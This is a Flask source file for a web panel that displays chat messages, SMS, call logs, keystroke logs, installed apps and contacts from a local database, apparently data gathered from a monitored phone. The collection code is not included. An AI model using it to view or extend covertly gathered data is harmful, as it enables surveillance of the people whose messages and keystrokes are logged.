from flask import Flask, render_template, send_from_directory, request, jsonify
import sqlite3

app = Flask(__name__, template_folder='templates', static_folder='static')

# Database connection (with error handling)
def get_db_connection():
		try:
				conn = sqlite3.connect('data.db')
				conn.row_factory = sqlite3.Row  # Access columns by name
				return conn
		except sqlite3.Error as e:
				print(f"Database error: {e}")
				return None # Return None if there's a DB issue

# Serve static files
@app.route('/static/<path:filename>')
def serve_static(filename):
		return send_from_directory('static', filename)

# Main menu route (with error handling for empty conversations)
@app.route('/')
def index():
		conn = get_db_connection()
		if conn: # Check if connection is valid before querying
				contacts = conn.execute(
						'SELECT DISTINCT sender AS name FROM ChatMessages UNION SELECT DISTINCT from_to AS name FROM SMS'
				).fetchall()
				conn.close()
		else:
				contacts = [] #Empty list if there's a DB problem

		return render_template('main_menu.html', contacts=contacts)

# Chat route (with standardized name and error handling)
@app.route('/chat/<contact_name>') #Standardized the variable name here
def chat(contact_name): # Standardized the variable name to match url
		conn = get_db_connection()
		if conn:
				messages = conn.execute(
						'SELECT * FROM ChatMessages WHERE sender = ? ORDER BY time', (contact_name,) # Using contact_name from URL
				).fetchall()
				conn.close()
		else:
				messages = None # Prevent error if no db
		return render_template('chat.html', name=contact_name, messages=messages) # Passing contact_name to template

# SMS route (with standardized name and error handling)
@app.route('/sms/<contact_name>')
def sms_thread(contact_name):
		conn = get_db_connection()
		if conn:
				sms_messages = conn.execute(
						'SELECT * FROM SMS WHERE from_to = ? ORDER BY time', (contact_name,)  # Using contact_name
				).fetchall()
				conn.close()
		else:
				sms_messages = None # Prevent error if no db
		return render_template('sms.html', name=contact_name, sms_messages=sms_messages)



@app.route('/calls')
def calls():
		conn = get_db_connection()
		if conn is not None: # Robust error handling
				call_logs = conn.execute('SELECT * FROM Calls').fetchall()
				conn.close()
				return render_template('calls.html', call_logs=call_logs)
		else:

				return "Error: Could not connect to the database." #Informative message



@app.route('/keylogs')
def keylogs():
		conn = get_db_connection()
		if conn is not None:  # Check for valid connection
				keylogs = conn.execute('SELECT * FROM Keylogs').fetchall()
				conn.close()
				return render_template('keylogs.html', keylogs=keylogs)
		else:
				return "Error: Could not connect to the database."

@app.route('/installed_apps')
def installed_apps():
		conn = get_db_connection()
		if conn: # Check db connection first
				installed_apps = conn.execute('SELECT * FROM InstalledApps').fetchall()
				conn.close()
				return render_template('installed_apps.html', installed_apps=installed_apps)
		else:
				return "Error: Could not connect to the database."

@app.route('/contacts')
def contacts_list():
		conn = get_db_connection()
		if conn:  # Only query if you have a valid connection
				contacts = conn.execute('SELECT * FROM Contacts').fetchall()
				conn.close()
				return render_template('contacts.html', contacts=contacts)
		else:
				return "Error: Could not connect to the database."

@app.route('/search', methods=['POST'])
def search():

		search_term = request.form.get('search_term')

		if not search_term:
				return jsonify({'error': 'Search term is required.'}), 400 # Return error and code

		conn = get_db_connection()
		if not conn:  # Return an error message if no db connection
				return jsonify({'error': 'Could not connect to database'}), 500

		chat_results = conn.execute(
				"SELECT sender, text, time FROM ChatMessages WHERE text LIKE ? ORDER BY time", ('%' + search_term + '%',)
		).fetchall()

		sms_results = conn.execute(
				"SELECT from_to, text, time FROM SMS WHERE text LIKE ? ORDER BY time", ('%' + search_term + '%',)
		).fetchall()

		conn.close()

		results = []

		for result in chat_results:
				results.append({
						'type': 'chat',
						'name': result['sender'],
						'text': result['text'],
						'time': result['time']
				})

		for result in sms_results:
				results.append({
						'type': 'sms',
						'name': result['from_to'],
						'text': result['text'],
						'time': result['time']

				})

		return jsonify(results)



if __name__ == '__main__':
		app.run(debug=True)